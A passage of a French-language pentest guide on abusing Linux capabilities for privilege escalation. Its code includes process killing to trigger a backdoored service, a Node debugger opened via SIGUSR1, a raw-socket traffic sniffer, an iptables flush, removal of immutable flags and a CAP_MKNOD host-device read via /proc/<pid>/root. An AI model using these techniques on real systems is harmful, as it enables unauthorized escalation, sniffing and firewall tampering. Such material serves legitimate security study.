wc -c /tmp/ht-rawio-proof.bin
sha256sum /tmp/ht-rawio-proof.bin
rm /tmp/ht-rawio-proof.bin
```

Ne devinez pas la plage : la lecture de certaines régions MMIO peut avoir des effets secondaires, et une adresse valide sur une plateforme peut contrôler le matériel ou la mémoire du kernel sur une autre. La modification de la mémoire du kernel ou le contrôle d’un périphérique nécessitent une preuve approuvée et spécifique à la plateforme ; il n’existe pas d’exemple universel sûr d’écriture brute.

## CAP_KILL

**Cette capability contourne les vérifications d’autorisation pour l’envoi de signaux aux processus dans les cas définis par le kernel**.<sup>[[14]](#references)</sup>

**Exemple avec un binaire**

Supposons que le binaire **`python`** dispose de cette capability. Si vous pouviez **également modifier la configuration d’un service ou d’un socket** (ou tout fichier de configuration lié à un service), vous pourriez y installer une backdoor, puis tuer le processus associé à ce service et attendre que le nouveau fichier de configuration soit exécuté avec votre backdoor.

```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```

**Privesc avec kill**

Si vous avez la capacité kill et qu’un **programme Node s’exécute en tant que root** (ou en tant qu’un autre utilisateur), vous pourriez probablement lui **envoyer** le **signal SIGUSR1** et lui faire **ouvrir le débogueur Node**, auquel vous pourrez vous connecter.

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```


{{#ref}}
../software-information/electron-cef-chromium-debugger-abuse.md
{{#endref}}


## CAP_NET_BIND_SERVICE

**Cette capability permet de se lier aux ports Internet inférieurs à 1024.** Elle n’accorde pas directement de privilèges plus étendus pour une élévation de privilèges.<sup>[[14]](#references)</sup>

**Exemple avec un binaire**

Si **`python`** possède cette capability, il pourra écouter sur n’importe quel port et même s’y connecter depuis n’importe quel autre port (certains services exigent des connexions provenant de ports privilégiés).

{{#tabs}}
{{#tab name="Listen"}}

```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
        output = connection.recv(1024).strip();
        print(output)
```

{{#endtab}}

{{#tab name="Connect"}}

```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```

{{#endtab}}
{{#endtabs}}

## CAP_NET_RAW

[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permet aux processus de **créer des sockets RAW et PACKET**, leur donnant la capacité de générer et d’envoyer des paquets réseau arbitraires. Cela peut entraîner des risques de sécurité dans les environnements conteneurisés, comme l’usurpation de paquets, l’injection de trafic et le contournement des contrôles d’accès réseau. Des acteurs malveillants pourraient exploiter cette capacité pour interférer avec le routage des conteneurs ou compromettre la sécurité du réseau de l’hôte, en particulier en l’absence de protections adéquates par pare-feu. De plus, **CAP_NET_RAW** permet des opérations comme l’envoi de ping via des requêtes ICMP RAW.<sup>[[14]](#references)</sup>

**Cela peut permettre la capture de paquets avec une interface de socket adaptée.** Cette capacité ne confère pas directement de privilèges plus étendus.<sup>[[14]](#references)</sup>

Pour établir une voie d’exposition d’identifiants, vérifiez également que le compte actuel peut exécuter un outil de capture doté de capacités effectives, que le trafic concerné traverse une interface visible dans son espace de noms réseau et que les données d’authentification sont envoyées en clair. Par exemple, des identifiants HTTP Basic transmis sur HTTP non chiffré peuvent être observés sur la boucle locale si l’outil de capture peut accéder à cette interface. Le passage à un autre compte nécessite également que l’identifiant capturé fonctionne pour une autre identité ; une capacité de fichier ou une requête de connexion visible ne suffit pas à établir la réutilisation du mot de passe.

Sur un hôte sans fil, un outil d’audit WPS exécutable comme `reaver` doté de `CAP_NET_RAW` effective, ainsi qu’un AP et une interface en mode moniteur visibles via `iw dev`, constituent un autre indice à examiner. Cela ne prouve **pas** qu’une élévation de privilèges est possible : l’AP doit exposer l’authentification par PIN WPS sans verrouillage effectif, être accessible depuis l’interface sans fil et divulguer une PSK ; les privilèges de l’hôte ne changent que si cette PSK est réutilisée pour un compte. L’énumération passive doit indiquer les modes et les capacités de l’interface, sans envoyer de sondes ni tenter de PIN. Consultez [CERT/CC VU#723755](https://www.kb.cert.org/vuls/id/723755) pour la faiblesse du PIN WPS et la [documentation du projet Reaver](https://github.com/shift/reaver-wps) pour le comportement de l’outil.

**Exemple avec un binaire**

Si le binaire **`tcpdump`** possède cette capacité, vous pourrez l’utiliser pour capturer des informations réseau.

```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```

Si l’**environnement** accorde cette capacité, **`tcpdump`** peut également l’utiliser pour renifler le trafic.<sup>[[14]](#references)</sup>

**Exemple avec le binaire 2**

L’exemple suivant est du code **`python2`** qui peut être utile pour intercepter le trafic de l’interface « **lo** » (**localhost**). Le code provient du lab « _The Basics: CAP-NET_BIND + NET_RAW_ » de [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com).<sup>[[1]](#references)</sup>

```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
    flag=""
    for i in xrange(8,-1,-1):
        if( flag_value & 1 <<i ):
            flag= flag + flags[8-i] + ","
    return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
    frame=s.recv(4096)
    ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
    proto=ip_header[6]
    ip_header_size = (ip_header[0] & 0b1111) * 4
    if(proto==6):
        protocol="TCP"
        tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
        tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
        dst_port=tcp_header[0]
        src_port=tcp_header[1]
        flag=" FLAGS: "+getFlag(tcp_header[4])

    elif(proto==17):
        protocol="UDP"
        udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
        udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
        dst_port=udp_header[0]
        src_port=udp_header[1]

    if (proto == 17 or proto == 6):
        print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
        count=count+1
```

## CAP_NET_ADMIN + CAP_NET_RAW

[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) donne à son détenteur le pouvoir de **modifier les configurations réseau**, notamment les paramètres du pare-feu, les tables de routage, les permissions des sockets et les paramètres des interfaces réseau dans l’espace de noms réseau actuel. Il peut également activer le mode promiscuité sur une interface de cet espace de noms ; cela peut exposer le trafic transmis à cette interface, mais ne permet pas à lui seul d’intercepter le trafic de n’importe quelle interface dans d’autres espaces de noms réseau.<sup>[[14]](#references)</sup>

Ces opérations affectent **l’espace de noms réseau actuel** du processus. Le contrôle de l’état réseau de l’hôte nécessite `--network=host`, `hostNetwork: true` dans Kubernetes ou une primitive distincte permettant d’entrer dans un espace de noms. `CAP_NET_RAW` seul ne constitue pas un shell générique sur l’hôte, mais a participé à une évasion documentée, spécifique à un protocole : une ancienne chaîne d’exploitation GCE combinait les privilèges root, l’espace de noms réseau de l’hôte, `CAP_NET_ADMIN`, `CAP_NET_RAW`, du trafic de métadonnées en clair et une requête raceable de l’agent invité pour injecter une clé SSH. Voir [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html) pour connaître toutes les conditions préalables et les réserves concernant HTTPS pour les métadonnées dans les versions modernes.

**Exemple avec un binaire**

Supposons que le **binaire python** dispose des capacités suivantes.

```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```

## CAP_LINUX_IMMUTABLE

**Cette capability permet de modifier les indicateurs d’inode, comme immutable et append-only. Elle ne permet pas directement une élévation de privilèges plus large.**<sup>[[14]](#references)</sup>

**Exemple avec un binaire**

Si vous constatez qu’un fichier est immutable et que Python possède cette capability, vous pouvez **supprimer l’attribut immutable et rendre le fichier modifiable :**

```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
# Python code to remove the immutable flag and allow modifications
import fcntl
import os
import struct

FS_IMMUTABLE_FL = 0x00000010
FS_IOC_GETFLAGS = 0x80086601
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
flags = struct.unpack('i', fcntl.ioctl(fd, FS_IOC_GETFLAGS, struct.pack('i', 0)))[0]
fcntl.ioctl(fd, FS_IOC_SETFLAGS, struct.pack('i', flags & ~FS_IMMUTABLE_FL))
os.close(fd)

with open('/path/to/file.sh', 'a') as f:
    f.write('New content for the file\n')
```

Les opérations `FS_IOC_GETFLAGS` et `FS_IOC_SETFLAGS` lisent et mettent à jour les indicateurs d’inode ; `FS_IMMUTABLE_FL` est l’indicateur immuable effacé par cet exemple.<sup>[[27]](#references)</sup>

> [!TIP]
> Notez que cet attribut immuable est généralement défini et supprimé à l’aide de :
>
> ```bash
> sudo chattr +i file.txt
> sudo chattr -i file.txt
> ```

## CAP_SYS_CHROOT

[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permet d’exécuter l’appel système `chroot(2)`, ce qui peut permettre de s’échapper d’une jail `chroot(2)` mal conçue en recourant à des techniques connues.<sup>[[11]](#references)[[14]](#references)</sup>

Il s’agit d’une **capacité permettant de s’échapper d’une jail chroot, et non d’une capacité permettant à elle seule de s’échapper d’un container vers l’hôte**. Elle n’expose pas le système de fichiers de l’hôte et ne contourne pas ses permissions. Si la racine de l’hôte est déjà montée ou accessible via `/proc/<pid>/root`, `chroot()` définit simplement cette arborescence existante comme racine des chemins du processus. Par ailleurs, la modification des mount namespaces avec `setns(2)` nécessite à la fois `CAP_SYS_CHROOT` et `CAP_SYS_ADMIN` dans le user namespace de l’appelant, ainsi que `CAP_SYS_ADMIN` dans le user namespace propriétaire du mount namespace cible.<sup>[[14]](#references)</sup>

- [Comment s’échapper de différentes solutions chroot](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf).<sup>[[11]](#references)</sup>
- [chw00t : outil d’évasion de chroot](https://github.com/earthquake/chw00t/)

## CAP_SYS_BOOT

[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permet d’exécuter l’appel système `reboot(2)` pour redémarrer le système, y compris avec des commandes telles que `LINUX_REBOOT_CMD_RESTART2` ; elle permet également d’utiliser `kexec_load(2)` et, depuis Linux 3.17, `kexec_file_load(2)` pour charger respectivement de nouveaux noyaux ou des noyaux de crash signés.<sup>[[14]](#references)</sup>

Dans un PID namespace privé, une requête `reboot()` prise en charge termine le processus init de ce namespace au lieu de redémarrer l’hôte. Un impact sur le redémarrage de l’hôte nécessite donc d’être dans le PID namespace initial, généralement via le partage des PID de l’hôte. Une prise de contrôle basée sur kexec nécessite en outre une image compatible, un syscall disponible, ainsi qu’une politique de lockdown et de signature permissive. Ne déclenchez aucune de ces opérations sur un hôte partagé dans le seul but de valider la capacité :

```bash
capsh --print | grep cap_sys_boot
readlink /proc/self/ns/pid /proc/1/ns/pid
command -v kexec 2>/dev/null
cat /sys/kernel/security/lockdown 2>/dev/null
```

## CAP_SYSLOG

[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) a été séparée de la capacité plus générale **CAP_SYS_ADMIN** dans Linux 2.6.37, afin d’accorder spécifiquement la possibilité d’utiliser l’appel `syslog(2)`. Cette capacité permet de consulter les adresses du noyau via `/proc` et des interfaces similaires lorsque le paramètre `kptr_restrict` est à 1, ce qui contrôle l’exposition des adresses du noyau. Depuis Linux 2.6.39, la valeur par défaut de `kptr_restrict` est 0, ce qui signifie que les adresses du noyau sont exposées, bien que de nombreuses distributions la définissent à 1 (masquer les adresses sauf pour uid 0) ou à 2 (toujours masquer les adresses) pour des raisons de sécurité.<sup>[[14]](#references)</sup>

De plus, **CAP_SYSLOG** permet d’accéder à la sortie de `dmesg` lorsque `dmesg_restrict` est à 1. Malgré ces changements, **CAP_SYS_ADMIN** conserve la possibilité d’effectuer des opérations `syslog`, en raison de précédents historiques.<sup>[[14]](#references)</sup>

## CAP_MKNOD

[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) étend les fonctionnalités de l’appel système `mknod` au-delà de la création de fichiers ordinaires, de FIFO (tubes nommés) ou de sockets de domaine UNIX. Elle permet spécifiquement de créer des fichiers spéciaux, notamment :<sup>[[14]](#references)</sup>

- **S_IFCHR** : fichiers spéciaux de type caractère, comme les terminaux.
- **S_IFBLK** : fichiers spéciaux de type bloc, comme les disques.

Cette capacité est utile aux processus qui doivent créer des fichiers de périphérique, notamment des périphériques de type caractère ou bloc.<sup>[[14]](#references)</sup>

Elle fait partie de l’ensemble de capacités par défaut documenté pour Docker ; vérifiez la configuration réelle du runtime plutôt que de supposer que tous les déploiements utilisent les mêmes valeurs par défaut ([liste des capacités par défaut de Moby](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).<sup>[[19]](#references)</sup>

Pour une évasion de conteneur, `CAP_MKNOD` peut créer un accès manquant à un véritable périphérique hôte, mais elle ne crée **pas** le périphérique sous-jacent et ne contourne **pas** le cgroup des périphériques. La chaîne complète nécessite :

1. `CAP_MKNOD` effective dans l’espace de noms utilisateur initial, car la création de périphériques n’est pas isolée par espace de noms.
2. Le type bloc ou caractère correct et les numéros majeur/mineur d’un véritable périphérique hôte.
3. L’autorisation du cgroup des périphériques pour ouvrir ce périphérique.
4. Un lecteur compatible avec le système de fichiers, ou `CAP_SYS_ADMIN` pour monter un système de fichiers de bloc.
5. Les autorisations du système de fichiers et du LSM pour créer et utiliser le nœud.

Pour un périphérique bloc de laboratoire utilisant un système de fichiers de la famille ext et dont les numéros majeur/mineur réels sont `252:1`, une validation en lecture seule est :

```bash
mknod /dev/ht-node-root b 252 1
ls -l /dev/ht-node-root
debugfs -R 'cat /etc/hostname' /dev/ht-node-root
rm /dev/ht-node-root
```

Remplacez les nombres par ceux indiqués dans `/sys/class/block/<device>/dev`. Si la création du nœud réussit, mais que son ouverture renvoie `Operation not permitted`, le device cgroup bloque toujours l’accès. C’est le résultat normal dans un conteneur qui dispose simplement du `CAP_MKNOD` par défaut de Docker, sans autorisation explicite pour le périphérique.

Il existe aussi une technique distincte de **two-foothold local privilege-escalation** qu’il ne faut pas confondre avec l’accès direct à un périphérique depuis un conteneur. Un processus root dans un conteneur qui partage le namespace utilisateur initial peut créer un nœud de périphérique bloc, tandis qu’un shell non privilégié sur l’hôte, avec un UID correspondant, ouvre ce nœud via `/proc/<container-pid>/root`. L’ouverture est alors évaluée dans le cgroup du shell sur l’hôte ; le refus d’accès du device cgroup du conteneur ne protège donc plus le périphérique.<sup>[[7]](#references)</sup>

Dans le conteneur, créez le nœud et laissez tourner un processus avec l’UID du foothold existant sur l’hôte :

```bash
host_uid=1000 # Replace with the UID of the existing unprivileged host shell.
mknod /dev/ht-node-root b 252 1 # Replace with the real host device numbers.
chown "$host_uid" /dev/ht-node-root
chmod 600 /dev/ht-node-root
bridge_user=$(getent passwd "$host_uid" | cut -d: -f1)
if [ -z "$bridge_user" ]; then
  useradd -u "$host_uid" -M htbridge
  bridge_user=htbridge
fi
su -s /bin/sh "$bridge_user" -c 'sleep 600'
```

Depuis le shell de l’hôte existant avec cet UID, identifiez le PID de l’hôte correspondant au processus du conteneur en veille, puis utilisez sa racine procfs comme chemin d’accès au périphérique :

```bash
container_pid=<host-pid-of-the-matching-uid-process>
stat "/proc/${container_pid}/root/dev/ht-node-root"
debugfs -R 'cat /etc/hostname' "/proc/${container_pid}/root/dev/ht-node-root"
```

Cette chaîne nécessite les deux points d’appui, un espace de noms utilisateur avec mappage d’identités ou partagé, la permission de parcourir `/proc/<pid>/root` cible, un véritable périphérique avec les bons numéros majeur/mineur, et un cgroup externe qui autorise l’ouverture. `hidepid`, les règles d’accès ptrace, un LSM, une incompatibilité du système de fichiers ou le remappage de l’espace de noms utilisateur peuvent la faire échouer. Cette technique historique est précieuse précisément parce qu’elle explique comment `/proc/<pid>/root` peut contourner la restriction du cgroup de périphériques du *conteneur* ; elle ne prétend pas que `CAP_MKNOD` suffit à s’échapper d’un conteneur normalement isolé.<sup>[[7]](#references)</sup>

### CAP_SETPCAP

Sur les noyaux Linux actuels avec les capabilities de fichiers, **`CAP_SETPCAP`** permet à un thread d’ajouter à son ensemble héritable des capabilities de son ensemble de limites, de supprimer des capabilities de son ensemble de limites et de modifier ses securebits. Elle ne permet pas à un processus d’accorder arbitrairement des capabilities à un autre processus ; ce comportement ne s’applique qu’aux noyaux antérieurs à la version 2.6.25 sans prise en charge des capabilities de fichiers.<sup>[[14]](#references)</sup>

L’appel système `capset()` peut ajuster les ensembles effectif, autorisé et héritable d’un thread, mais le nouvel ensemble autorisé ne peut pas contenir de capabilities absentes de l’ensemble autorisé existant, et les mises à jour de l’ensemble héritable restent soumises aux contraintes du noyau.<sup>[[14]](#references)</sup>

## References

- [1] [AttackDefense (Pentester Academy) - Ateliers d’escalade de privilèges avec les capabilities Linux](https://attackdefense.pentesteracademy.com)
- [2] [Grimoire du hacker - Escalade de privilèges sous Linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
- [3] [Bases des conteneurs Linux : capabilities](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
- [4] [Les capabilities Linux 101](https://linux-audit.com/linux-capabilities-101/)
- [5] [Tirer parti des capabilities Linux](https://www.linuxjournal.com/article/5737)
- [6] [Capabilities excessives](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
- [7] [Abus de l’accès aux espaces de noms de montage via /proc/pid/root](https://labs.reversec.com/posts/2020/06/abusing-access-to-mount-namespaces-through-procpidroot)
- [8] [Capabilities Linux : pourquoi elles existent et comment elles fonctionnent](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
- [9] [Comprendre les capabilities sous Linux](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)
- [10] [PoC de contournement de seccomp si ptrace est autorisé](https://gist.github.com/thejh/8346f47e359adecd1d53)
- [11] [Comment s’échapper de diverses solutions chroot](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
- [12] [shocker.c - Exploit original d’évasion de Docker utilisant CAP_DAC_READ_SEARCH, par Sebastian Krahmer](http://stealth.openwall.net/xSports/shocker.c)
- [13] [Analyse d’un exploit d’évasion de Docker](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)
- [14] [capabilities(7) - Page de manuel Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [15] [proc_pid_status(5) - Page de manuel Linux](https://man7.org/linux/man-pages/man5/proc_pid_status.5.html)
- [16] [pam_cap(8) - Page de manuel Linux](https://man7.org/linux/man-pages/man8/pam_cap.8.html)
- [17] [capability.conf(5) - Page de manuel Ubuntu](https://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)
- [18] [systemd.exec(5) - Page de manuel Linux](https://man7.org/linux/man-pages/man5/systemd.exec.5.html)
- [19] [Exécution de conteneurs - Documentation Docker](https://docs.docker.com/engine/containers/run/)
- [20] [docker container run - Documentation Docker](https://docs.docker.com/reference/cli/docker/container/run)
- [21] [cap_text_formats(7) - Page de manuel Linux](https://man7.org/linux/man-pages/man7/cap_text_formats.7.html)
- [22] [getpcaps(8) - Page de manuel Linux](https://man7.org/linux/man-pages/man8/getpcaps.8.html)
- [23] [getcap(8) - Page de manuel Linux](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [24] [amicontained](https://github.com/genuinetools/amicontained)
- [25] [setcap(8) - Page de manuel Linux](https://man7.org/linux/man-pages/man8/setcap.8.html)
- [26] [capsh(1) - Page de manuel Linux](https://man7.org/linux/man-pages/man1/capsh.1.html)
- [27] [ioctl_iflags(2) - Page de manuel Linux](https://man7.org/linux/man-pages/man2/ioctl_iflags.2.html)
{{#include ../../banners/hacktricks-training.md}}
